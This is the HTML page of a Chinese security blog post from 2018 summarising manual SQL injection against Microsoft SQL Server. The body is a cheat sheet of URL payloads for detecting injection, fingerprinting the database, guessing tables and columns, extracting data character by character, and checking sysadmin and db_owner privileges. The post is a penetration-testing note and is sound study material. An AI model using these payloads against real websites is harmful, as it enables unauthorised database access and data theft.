            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-03T15:29:52+08:00">
                2018-05-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/笔记/" itemprop="url" rel="index">
                    <span itemprop="name">笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/03/MSSQL注入总结/" class="leancloud_visitors" data-flag-title="MSSQL注入总结">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前所有的sql注入类型的博客都以mysql数据库为例子的，但是在最近实际的渗透测试中有时会遇到一些MSSQL的数据库，所以对MSSQL注入进行一次总结。</p>
<h2 id="0x01-MSSQL"><a href="#0x01-MSSQL" class="headerlink" title="0x01 MSSQL"></a>0x01 MSSQL</h2><p>ms SQL是指微软的SQLServer数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。</p>
<h2 id="0x02-MSSQL手工注入技巧"><a href="#0x02-MSSQL手工注入技巧" class="headerlink" title="0x02 MSSQL手工注入技巧"></a>0x02 MSSQL手工注入技巧</h2><h4 id="1-判断是否有注入"><a href="#1-判断是否有注入" class="headerlink" title="1.判断是否有注入"></a>1.判断是否有注入</h4><ul>
<li>?id=1</li>
<li>?id=1’</li>
<li>?id=1 and 1=1</li>
<li>?id=1 and 1=2</li>
</ul>
<h4 id="2-判断是否是mssql"><a href="#2-判断是否是mssql" class="headerlink" title="2.判断是否是mssql"></a>2.判断是否是mssql</h4><ul>
<li>?id=1 and user&gt;0</li>
</ul>
<h4 id="3-判断数据库系统"><a href="#3-判断数据库系统" class="headerlink" title="3.判断数据库系统"></a>3.判断数据库系统</h4><ul>
<li>?id=1 and (select count(*) from sysobjects)&gt;0　　 mssql</li>
<li>?id=1 and (select count(*) from msysobjects)&gt;0　　access</li>
</ul>
<h4 id="4-查询当前用户数据信息"><a href="#4-查询当前用户数据信息" class="headerlink" title="4.查询当前用户数据信息"></a>4.查询当前用户数据信息</h4><ul>
<li>?id=1 having 1=1–</li>
</ul>
<h4 id="5-猜表名"><a href="#5-猜表名" class="headerlink" title="5.猜表名"></a>5.猜表名</h4><ul>
<li>?id=1 and exists(select * from tablename)</li>
<li>?id=1 and (Select Count(*) from [表名])&gt;0</li>
</ul>
<h4 id="6-猜字段"><a href="#6-猜字段" class="headerlink" title="6.猜字段"></a>6.猜字段</h4><ul>
<li>?id=1 and (Select Count(字段名) from 表名)&gt;0</li>
</ul>
<h4 id="7-暴当前表中的列"><a href="#7-暴当前表中的列" class="headerlink" title="7.暴当前表中的列"></a>7.暴当前表中的列</h4><ul>
<li>?id=1 group by admin.username having 1=1–</li>
</ul>
<h4 id="8-猜字段中记录长度"><a href="#8-猜字段中记录长度" class="headerlink" title="8.猜字段中记录长度"></a>8.猜字段中记录长度</h4><ul>
<li>?id=1 and (select top 1 len(字段名) from 表名)&gt;0</li>
</ul>
<h4 id="9-猜字段中的ascii值"><a href="#9-猜字段中的ascii值" class="headerlink" title="9.猜字段中的ascii值"></a>9.猜字段中的ascii值</h4><ul>
<li>?id=1 and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0   access</li>
<li>?id=1 and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)&gt;0   mssql</li>
</ul>
<h4 id="10-测试权限结构（mssql）"><a href="#10-测试权限结构（mssql）" class="headerlink" title="10.测试权限结构（mssql）"></a>10.测试权限结构（mssql）</h4><ul>
<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘sysadmin’));–</li>
<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘serveradmin’));–</li>
<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘setupadmin’));–</li>
<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘securityadmin’));–</li>
<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘diskadmin’));–</li>
<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘bulkadmin’));–</li>
<li>?id=1 and 1=(SELECT IS_MEMBER(‘db_owner’));–</li>
</ul>
<h4 id="11-mssql内置函数"><a href="#11-mssql内置函数" class="headerlink" title="11.mssql内置函数"></a>11.mssql内置函数</h4><ul>
<li>?id=1 and (select @@version)&gt;0　　　获得Windows的版本号</li>
<li>?id=1 and user_name()=’dbo’　　　　 判断当前系统的连接用户是不是sa</li>
<li>?id=1 and (select user_name())&gt;0　　爆当前系统的连接用户</li>
<li>?id=1 and (select db_name())&gt;0　　　得到当前连接的数据库</li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/uploads/avatar.jpg"
               alt="麻薯" />
          <p class="site-author-name" itemprop="name">麻薯</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">104</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">24</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">64</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        

		
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">麻薯</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  






  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  


  




	





  





  





  






  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>AV.initialize("GWhcWVw7VpoLTRfaQ2D1q3fj-gzGzoHsz", "4eb8jdrkQzBrcf7sJImJdOPd");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  

  <a href="https://github.com/echohun"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://camo.githubusercontent.com/567c3a48d796e2fc06ea80409cc9dd82bf714434/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f6c6566745f6461726b626c75655f3132313632312e706e67" alt="fork me on github" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_left_darkblue_121621.png"></a>
</body>
</html>
